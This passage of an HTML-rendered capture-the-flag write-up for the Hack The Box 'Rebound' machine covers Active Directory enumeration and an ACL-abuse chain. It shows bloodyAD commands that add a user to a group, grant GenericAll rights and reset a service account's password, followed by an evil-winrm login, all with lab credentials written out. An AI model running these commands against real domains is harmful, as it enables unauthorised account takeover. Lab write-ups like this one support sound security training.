<span class="n">group</span><span class="p">:[</span><span class="n">Enterprise</span> <span class="n">Key</span> <span class="n">Admins</span><span class="p">]</span> <span class="n">rid</span><span class="p">:[</span><span class="mh">0x20f</span><span class="p">]</span>
<span class="n">group</span><span class="p">:[</span><span class="n">DnsUpdateProxy</span><span class="p">]</span> <span class="n">rid</span><span class="p">:[</span><span class="mh">0x44e</span><span class="p">]</span>
<span class="n">group</span><span class="p">:[</span><span class="n">ServiceMgmt</span><span class="p">]</span> <span class="n">rid</span><span class="p">:[</span><span class="mh">0x1e03</span><span class="p">]</span>
<span class="nd">rpcclient</span> <span class="err">$</span><span class="o">&gt;</span>
</pre></div>
<p>These groups look normal; however, we can highlight the <code>ServiceMgmt</code> group, which is not a default group. Let's copy its RID and search for members of this group</p><br/>
<div class="highlight"><pre><span></span><span class="nd">rpcclient</span> <span class="err">$</span><span class="o">&gt;</span> <span class="n">querygroupmem</span> <span class="mh">0x1e03</span>
    <span class="n">rid</span><span class="p">:[</span><span class="mh">0x79f</span><span class="p">]</span> <span class="n">attr</span><span class="p">:[</span><span class="mh">0x7</span><span class="p">]</span>
    <span class="n">rid</span><span class="p">:[</span><span class="mh">0xd36</span><span class="p">]</span> <span class="n">attr</span><span class="p">:[</span><span class="mh">0x7</span><span class="p">]</span>
<span class="nd">rpcclient</span> <span class="err">$</span><span class="o">&gt;</span>
</pre></div>
<p>As we can't see the usernames, we can use <code>query user</code> and supply their RID.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">rpcclient</span> <span class="err">$</span><span class="o">&gt;</span> <span class="n">queryuser</span> <span class="mh">0x79f</span>
    <span class="n">User</span> <span class="n">Name</span>   <span class="p">:</span>  <span class="n">ppaul</span>
    <span class="n">Full</span> <span class="n">Name</span>   <span class="p">:</span>  
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="nd">rpcclient</span> <span class="err">$</span><span class="o">&gt;</span> <span class="n">queryuser</span> <span class="mh">0xd36</span>
    <span class="n">User</span> <span class="n">Name</span>   <span class="p">:</span>  <span class="n">fflock</span>
    <span class="n">Full</span> <span class="n">Name</span>   <span class="p">:</span>  
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="nd">rpcclient</span> <span class="err">$</span><span class="o">&gt;</span>
</pre></div>
<p>These users belong to the <code>ServiceMgmt</code> group. However, we lack valid credentials for them.</p><br/>
<h3>Bloodhound</h3><br/>
<p>Let's launch BloodHound remotely to perform a thorough enumeration against the Active Directory environment. To do this, firstly you have to install BloodHound from PyPi:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">pip</span> <span class="n">install</span> <span class="n">bloodhound</span>
</pre></div>
<p>Upon executing it, it threw an error.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">bloodhound</span><span class="o">-</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="nb">all</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'ldap_monitor'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'1GR8t@$$4u'</span> <span class="o">-</span><span class="n">d</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">ns</span> <span class="mf">10.10.11.231</span> <span class="o">--</span><span class="nb">zip</span> <span class="o">--</span><span class="n">use</span><span class="o">-</span><span class="n">ldaps</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="n">AD</span> <span class="n">domain</span><span class="p">:</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Getting</span> <span class="n">TGT</span> <span class="k">for</span> <span class="n">user</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="n">LDAP</span> <span class="n">server</span><span class="p">:</span> <span class="n">dc01</span><span class="o">.</span><span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">1</span> <span class="n">domains</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
  <span class="n">File</span> <span class="s2">"/home/elswix/Desktop/elswix/HTB/Rebound/content/bh/venv/lib/python3.10/site-packages/bloodhound/ad/utils.py"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">362</span><span class="p">,</span> <span class="ow">in</span> <span class="n">get_entry_property</span>
    <span class="n">value</span> <span class="o">=</span> <span class="n">entry</span><span class="p">[</span><span class="s1">'attributes'</span><span class="p">][</span><span class="n">prop</span><span class="p">]</span>
<span class="ne">TypeError</span><span class="p">:</span> <span class="s1">'NoneType'</span> <span class="nb">object</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">subscriptable</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>The latest version crashes running with <code>-c all</code>, I was able to fix it by modifying the source code, but installing an older version is an easier solution.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">pip</span> <span class="n">install</span> <span class="n">bloodhound</span><span class="o">==</span><span class="mf">1.6.1</span>
</pre></div>
<p>This worked perfectly!</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">bloodhound</span><span class="o">-</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="nb">all</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'ldap_monitor'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'1GR8t@$$4u'</span> <span class="o">-</span><span class="n">d</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">ns</span> <span class="mf">10.10.11.231</span> <span class="o">--</span><span class="nb">zip</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="n">AD</span> <span class="n">domain</span><span class="p">:</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Getting</span> <span class="n">TGT</span> <span class="k">for</span> <span class="n">user</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="n">LDAP</span> <span class="n">server</span><span class="p">:</span> <span class="n">dc01</span><span class="o">.</span><span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>
<span class="n">WARNING</span><span class="p">:</span> <span class="n">LDAP</span> <span class="n">Authentication</span> <span class="ow">is</span> <span class="n">refused</span> <span class="n">because</span> <span class="n">LDAP</span> <span class="n">signing</span> <span class="ow">is</span> <span class="n">enabled</span><span class="o">.</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">connect</span> <span class="n">over</span> <span class="n">LDAPS</span> <span class="n">instead</span><span class="o">...</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="n">resolved</span><span class="o">.</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Done</span> <span class="ow">in</span> <span class="mi">00</span><span class="n">M</span> <span class="mi">49</span><span class="n">S</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Compressing</span> <span class="n">output</span> <span class="n">into</span> <span class="mi">20240329163209</span><span class="n">_bloodhound</span><span class="o">.</span><span class="n">zip</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>After importing the ZIP file into BloodHound and searching for the shortest path to high-value targets, the result is messy.</p><br/>
<p><img alt="" src="https://elswix.github.io/writeups/htb/insane/rebound/img/1.png"/></p><br/>
<p>Looking at the Kerberoastable accounts, we can see <code>ldap_monitor</code> and the <code>gmsa.rebound.htb</code> accounts:</p><br/>
<p><img alt="" src="https://elswix.github.io/writeups/htb/insane/rebound/img/2.png"/></p><br/>
<p>The account <code>gmsa.rebound.htb</code> has the sAMAccountName <code>delegator$</code>. Its name is a hint for later.</p><br/>
<p>The <code>ServiceMgmt</code> group caught my attention, and while searching for potential privilege escalation vectors, I came across the following:</p><br/>
<p><img alt="" src="https://elswix.github.io/writeups/htb/insane/rebound/img/3.png"/></p><br/>
<p>The <code>ServiceMgmt</code> group has the GenericAll privilege over the <code>SERVICE USERS</code> OU, which contains the <code>WINRM_SVC</code> user, who can enter an interactive session with the target computer. Let's explain this concepts:</p><br/>
<p><strong>GenericAll:</strong> It is an access control permission in Windows systems that grants a user the right to perform any permitted operation on an object, such as viewing, modifying, or deleting the object, regardless of any other specific permissions the user may have.</p><br/>
<p>As per the <a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html">bloodhound</a> documentation:</p><br/>
<p><strong>Contains:</strong> GPOs linked to a container apply to all objects that are contained by the container. Additionally, ACEs set on a parent OU may inherit down to child objects. The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types</p><br/>
<p><strong>CanPSRemote:</strong> PS Session access allows you to enter an interactive session with the target computer. If authenticating as a low privilege user, a privilege escalation may allow you to gain high privileges on the system.</p><br/>
<p>Exploiting this could allow us to gain access to the system. However, there is a problem. We don't have credentials for any of the users that belong to this group, and according to the BloodHound enumeration, there is no way, leveraging the users we obtained, to gain access to the <code>ServiceMgmt</code> group.</p><br/>
<p>When I was exploiting this machine for the first time, it took me a lot of time to find the right way. Since the users <code>ppaul</code> and <code>fflock</code> belong to <code>ServiceMgmt</code>, I assumed finding a way to access these users would be the correct path. However, it wasn't, so I decided to manually inspect the <code>ACLs</code> of <code>ServiceMgmt</code>.</p><br/>
<p>If we had access to the system, we could import the <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a> module to perform enumeration. However, since this is not the case, we must opt for an alternative. I'll use the (partial) Python alternative <a href="https://github.com/the-useless-one/pywerview">Pywerview</a>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">pywerview</span> <span class="n">get</span><span class="o">-</span><span class="n">objectacl</span> <span class="o">--</span><span class="n">name</span> <span class="s1">'ServiceMgmt'</span> <span class="o">-</span><span class="n">w</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'oorend'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'1GR8t@$$4u'</span> <span class="o">-</span><span class="n">t</span> <span class="mf">10.10.11.231</span> <span class="o">--</span><span class="n">tls</span> <span class="o">--</span><span class="n">resolve</span><span class="o">-</span><span class="n">sids</span> <span class="o">--</span><span class="n">resolve</span><span class="o">-</span><span class="n">guids</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="n">objectdn</span><span class="p">:</span>               <span class="n">CN</span><span class="o">=</span><span class="n">ServiceMgmt</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">rebound</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">htb</span>
<span class="n">objectsid</span><span class="p">:</span>              <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4078382237</span><span class="o">-</span><span class="mi">1492182817</span><span class="o">-</span><span class="mi">2568127209</span><span class="o">-</span><span class="mi">7683</span>
<span class="n">acetype</span><span class="p">:</span>                <span class="n">ACCESS_ALLOWED_OBJECT_ACE</span>
<span class="n">binarysize</span><span class="p">:</span>             <span class="mi">40</span>
<span class="n">aceflags</span><span class="p">:</span>               
<span class="n">accessmask</span><span class="p">:</span>             <span class="mi">256</span>
<span class="n">activedirectoryrights</span><span class="p">:</span>  <span class="n">extended_right</span>
<span class="n">isinherited</span><span class="p">:</span>            <span class="kc">False</span>
<span class="n">securityidentifier</span><span class="p">:</span>     <span class="n">Authenticated</span> <span class="n">Users</span>
<span class="n">objectaceflags</span><span class="p">:</span>         <span class="n">object_ace_type_present</span>
<span class="n">objectacetype</span><span class="p">:</span>          <span class="n">Send</span><span class="o">-</span><span class="n">To</span>
<span class="n">inheritedobjectacetype</span><span class="p">:</span> <span class="n">All</span>
<span class="n">iscallbak</span><span class="p">:</span>              <span class="kc">False</span>

<span class="n">objectdn</span><span class="p">:</span>              <span class="n">CN</span><span class="o">=</span><span class="n">ServiceMgmt</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">rebound</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">htb</span>
<span class="n">objectsid</span><span class="p">:</span>             <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4078382237</span><span class="o">-</span><span class="mi">1492182817</span><span class="o">-</span><span class="mi">2568127209</span><span class="o">-</span><span class="mi">7683</span>
<span class="n">acetype</span><span class="p">:</span>               <span class="n">ACCESS_ALLOWED_ACE</span>
<span class="n">binarysize</span><span class="p">:</span>            <span class="mi">36</span>
<span class="n">aceflags</span><span class="p">:</span>              
<span class="n">accessmask</span><span class="p">:</span>            <span class="mi">8</span>
<span class="n">activedirectoryrights</span><span class="p">:</span> <span class="bp">self</span>
<span class="n">isinherited</span><span class="p">:</span>           <span class="kc">False</span>
<span class="n">securityidentifier</span><span class="p">:</span>    <span class="n">CN</span><span class="o">=</span><span class="n">oorend</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">rebound</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">htb</span>
<span class="n">iscallbak</span><span class="p">:</span>             <span class="kc">False</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>Of course, it returned a very long output, but while analyzing it, one <strong>ACE</strong> instantly caught my attention. As you have seen above, <code>oorend</code> has a <strong>"Self"</strong> right over <code>ServiceMgmt</code>.</p><br/>
<p>According to <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#self-self-membership-on-group">HackTricks</a>, the <strong>"Self"</strong> privilege enables attackers to <strong>add themselves</strong> to specific groups, such as <code>Domain Admins</code>, through commands that manipulate group membership directly. I don't know why it was not reported on the BloodHound enumeration; probably because we installed an outdated version.</p><br/>
<p>Since we have valid credentials for <code>oorend</code> and it has <strong>Self</strong> privilege over <code>ServiceMgmt</code>, we could attempt to add <code>oorend</code> to <code>ServiceMgmt</code>. To achieve this, I'll use <code>bloodyAD</code> (you can install it from PyPi):</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">bloodyAD</span> <span class="o">-</span><span class="n">d</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'oorend'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'1GR8t@$$4u'</span> <span class="o">--</span><span class="n">host</span> <span class="mf">10.10.11.231</span> <span class="n">add</span> <span class="n">groupMember</span> <span class="n">servicemgmt</span> <span class="n">oorend</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">oorend</span> <span class="n">added</span> <span class="n">to</span> <span class="n">servicemgmt</span>
</pre></div>
<p>Great, it worked! Now, since we belong to <code>ServiceMgmt</code>, we can exploit the path displayed on Bloodhound.</p><br/>
<p>Recalling what we've seen, as a member of <code>ServiceMgmt</code>, we have <strong>GenericAll</strong> access over the <code>SERVICE USERS</code> OU, and since it <strong>"Contains"</strong> the <code>winrm_svc</code> user, we could change the password of <code>winrm_svc</code>. </p><br/>
<p>One step at a time, we will first grant <strong>GenericAll</strong> privilege to <code>oorend</code> in order to subsequently operate over the <code>SERVICE USERS</code> OU.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">bloodyAD</span> <span class="o">-</span><span class="n">d</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'oorend'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'1GR8t@$$4u'</span> <span class="o">--</span><span class="n">host</span> <span class="mf">10.10.11.231</span> <span class="n">add</span> <span class="n">genericAll</span> <span class="s1">'OU=SERVICE USERS,DC=REBOUND,DC=HTB'</span> <span class="n">oorend</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">oorend</span> <span class="n">has</span> <span class="n">now</span> <span class="n">GenericAll</span> <span class="n">on</span> <span class="n">OU</span><span class="o">=</span><span class="n">SERVICE</span> <span class="n">USERS</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">REBOUND</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">HTB</span>
</pre></div>
<p>Now, leveraging our privileges over the <code>SERVICE USERS</code> OU, I'll assign <strong>GenericAll</strong> privileges to <code>oorend</code> over <code>winrm_svc</code> to subsequently modify its password.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">bloodyAD</span> <span class="o">-</span><span class="n">d</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'oorend'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'1GR8t@$$4u'</span> <span class="o">--</span><span class="n">host</span> <span class="mf">10.10.11.231</span> <span class="n">add</span> <span class="n">genericAll</span> <span class="n">winrm_svc</span> <span class="n">oorend</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">oorend</span> <span class="n">has</span> <span class="n">now</span> <span class="n">GenericAll</span> <span class="n">on</span> <span class="n">winrm_svc</span>
</pre></div>
<p>Finally, we can change the password of <code>winrm_svc</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">bloodyAD</span> <span class="o">-</span><span class="n">d</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'oorend'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'1GR8t@$$4u'</span> <span class="o">--</span><span class="n">host</span> <span class="mf">10.10.11.231</span> <span class="nb">set</span> <span class="n">password</span> <span class="s1">'winrm_svc'</span> <span class="s1">'Password123!'</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Password</span> <span class="n">changed</span> <span class="n">successfully</span><span class="err">!</span>
</pre></div>
<p>If everything worked correctly, the password of <code>winrm_svc</code> should be <code>Password123!</code>.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.231</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'winrm_svc'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'Password123!'</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">rebound</span><span class="o">.</span><span class="n">htb</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">winrm_svc</span><span class="p">:</span><span class="n">Password123</span><span class="err">!</span>
</pre></div>
<p>Great! As <code>winrm_svc</code>, we could gain access to the system via <code>WinRM</code>.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">evil</span><span class="o">-</span><span class="n">winrm</span> <span class="o">-</span><span class="n">i</span> <span class="mf">10.10.11.231</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'winrm_svc'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'Password123!'</span>

<span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span> <span class="n">shell</span> <span class="n">v3</span><span class="mf">.5</span>

<span class="n">Info</span><span class="p">:</span> <span class="n">Establishing</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">remote</span> <span class="n">endpoint</span>
<span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">winrm_svc</span>\<span class="n">Documents</span><span class="o">&gt;</span>
</pre></div>
<p>Finally, we gained access to the system as <code>winrm_svc</code>.</p><br/>
<p>We can read <code>user.txt</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">winrm_svc</span>\<span class="n">desktop</span><span class="o">&gt;</span> <span class="nb">type</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
<span class="n">c3f52</span><span class="o">**************</span><span class="mf">1883e3</span><span class="n">b632648</span>
<span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">winrm_svc</span>\<span class="n">desktop</span><span class="o">&gt;</span>
</pre></div>
<p>Upon accessing the system, I opted to relaunch <code>SharpHound</code>, this time running it locally. However, it failed to retrieve any additional relevant information.</p><br/>
<p>After conducting system enumeration using <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a>, I discovered that the computer account <code>delegator$</code> possesses constrained delegation privileges over the <code>http/dc01.rebound.htb</code> SPN:</p><br/>
<div class="highlight"><pre><span></span><span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">temp</span><span class="o">&gt;</span> <span class="n">Get</span><span class="o">-</span><span class="n">DomainComputer</span> <span class="o">-</span><span class="n">TrustedToAuth</span> 


<span class="n">pwdlastset</span>                     <span class="p">:</span> <span class="mi">3</span><span class="o">/</span><span class="mi">28</span><span class="o">/</span><span class="mi">2024</span> <span class="mi">6</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">42</span> <span class="n">PM</span>
<span class="n">logoncount</span>                     <span class="p">:</span> <span class="mi">14</span>
<span class="n">badpasswordtime</span>                <span class="p">:</span> <span class="mi">3</span><span class="o">/</span><span class="mi">29</span><span class="o">/</span><span class="mi">2024</span> <span class="mi">11</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">23</span> <span class="n">AM</span>
<span class="n">msds</span><span class="o">-</span><span class="n">managedpasswordpreviousid</span> <span class="p">:</span> <span class="p">{</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mf">0.</span><span class="o">..</span><span class="p">}</span>
<span class="n">distinguishedname</span>              <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">delegator</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Managed</span> <span class="n">Service</span> <span class="n">Accounts</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">rebound</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">htb</span> 
<span class="n">objectclass</span>                    <span class="p">:</span> <span class="p">{</span><span class="n">top</span><span class="p">,</span> <span class="n">person</span><span class="p">,</span> <span class="n">organizationalPerson</span><span class="p">,</span> <span class="n">user</span><span class="o">...</span><span class="p">}</span>
<span class="n">lastlogontimestamp</span>             <span class="p">:</span> <span class="mi">4</span><span class="o">/</span><span class="mi">8</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">11</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">56</span> <span class="n">AM</span>
<span class="n">name</span>                           <span class="p">:</span> <span class="n">delegator</span>
<span class="n">objectsid</span>                      <span class="p">:</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4078382237</span><span class="o">-</span><span class="mi">1492182817</span><span class="o">-</span><span class="mi">2568127209</span><span class="o">-</span><span class="mi">7687</span>
<span class="n">msds</span><span class="o">-</span><span class="n">groupmsamembership</span>        <span class="p">:</span> <span class="p">{</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mf">128.</span><span class="o">..</span><span class="p">}</span>
<span class="n">oocalpolicyflags</span>               <span class="p">:</span> <span class="mi">0</span>
<span class="n">codepage</span>                       <span class="p">:</span> <span class="mi">0</span>
<span class="n">samaccounttype</span>                 <span class="p">:</span> <span class="n">MACHINE_ACCOUNT</span>
<span class="n">accountexpires</span>                 <span class="p">:</span> <span class="n">NEVER</span>
<span class="n">countrycode</span>                    <span class="p">:</span> <span class="mi">0</span>
<span class="n">whenchanged</span>                    <span class="p">:</span> <span class="mi">3</span><span class="o">/</span><span class="mi">29</span><span class="o">/</span><span class="mi">2024</span> <span class="mi">1</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">42</span> <span class="n">AM</span>
<span class="n">instancetype</span>                   <span class="p">:</span> <span class="mi">4</span>
<span class="n">usncreated</span>                     <span class="p">:</span> <span class="mi">69353</span>
<span class="n">objectguid</span>                     <span class="p">:</span> <span class="n">c9da97ae</span><span class="o">-</span><span class="mf">5e35</span><span class="o">-</span><span class="mi">44</span><span class="n">d2</span><span class="o">-</span><span class="n">aa15</span><span class="o">-</span><span class="mi">114</span><span class="n">aecdc0caf</span>
<span class="n">msds</span><span class="o">-</span><span class="n">managedpasswordid</span>         <span class="p">:</span> <span class="p">{</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mf">0.</span><span class="o">..</span><span class="p">}</span>
<span class="n">msds</span><span class="o">-</span><span class="n">allowedtodelegateto</span>       <span class="p">:</span> <span class="n">http</span><span class="o">/</span><span class="n">dc01</span><span class="o">.</span><span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>
<span class="n">samaccountname</span>                 <span class="p">:</span> <span class="n">delegator</span><span class="err">$</span>
<span class="n">objectcategory</span>                 <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">ms</span><span class="o">-</span><span class="n">DS</span><span class="o">-</span><span class="n">Group</span><span class="o">-</span><span class="n">Managed</span><span class="o">-</span><span class="n">Service</span><span class="o">-</span><span class="n">Account</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Schema</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Configuration</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">rebound</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">htb</span>
<span class="n">dscorepropagationdata</span>          <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="o">/</span><span class="mi">1601</span> <span class="mi">12</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span> <span class="n">AM</span>
<span class="n">serviceprincipalname</span>           <span class="p">:</span> <span class="n">browser</span><span class="o">/</span><span class="n">dc01</span><span class="o">.</span><span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>
<span class="n">msds</span><span class="o">-</span><span class="n">managedpasswordinterval</span>   <span class="p">:</span> <span class="mi">30</span>
<span class="n">lastlogon</span>                      <span class="p">:</span> <span class="mi">4</span><span class="o">/</span><span class="mi">9</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">3</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">20</span> <span class="n">AM</span>
<span class="n">badpwdcount</span>                    <span class="p">:</span> <span class="mi">1</span>
<span class="n">cn</span>                             <span class="p">:</span> <span class="n">delegator</span>
<span class="n">useraccountcontrol</span>             <span class="p">:</span> <span class="n">WORKSTATION_TRUST_ACCOUNT</span>
<span class="n">whencreated</span>                    <span class="p">:</span> <span class="mi">4</span><span class="o">/</span><span class="mi">8</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">9</span><span class="p">:</span><span class="mi">08</span><span class="p">:</span><span class="mi">31</span> <span class="n">AM</span>
<span class="n">primarygroupid</span>                 <span class="p">:</span> <span class="mi">515</span>
<span class="n">iscriticalsystemobject</span>         <span class="p">:</span> <span class="kc">False</span>
<span class="n">msds</span><span class="o">-</span><span class="n">supportedencryptiontypes</span>  <span class="p">:</span> <span class="mi">28</span>
<span class="n">usnchanged</span>                     <span class="p">:</span> <span class="mi">172255</span>
<span class="n">lastlogoff</span>                     <span class="p">:</span> <span class="mi">12</span><span class="o">/</span><span class="mi">31</span><span class="o">/</span><span class="mi">1600</span> <span class="mi">4</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span> <span class="n">PM</span>
<span class="n">dnshostname</span>                    <span class="p">:</span> <span class="n">gmsa</span><span class="o">.</span><span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>



<span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">temp</span><span class="o">&gt;</span>
</pre></div>
<p>You can also enumerate it using <code>Get-NetComputer</code>:</p><br/>
